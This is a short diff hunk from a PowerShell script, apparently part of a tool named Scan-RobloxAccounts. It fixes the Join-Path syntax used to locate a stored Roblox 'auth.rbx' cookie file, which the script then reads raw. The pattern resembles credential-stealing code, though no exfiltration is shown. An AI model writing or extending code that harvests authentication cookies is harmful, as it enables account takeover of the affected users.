@@ -125,7 +125,7 @@ function Scan-RobloxAccounts {
     foreach ($path in $robloxPaths) {
         if (Test-Path $path) {
             # Check for auth cookies
-            $authFile = Join-Path $path "Cookies" "auth.rbx"
+            $authFile = Join-Path -Path $path -ChildPath "Cookies" -AdditionalChildPath "auth.rbx"
             if (Test-Path $authFile) {
                 $content = Get-Content $authFile -Raw
                 
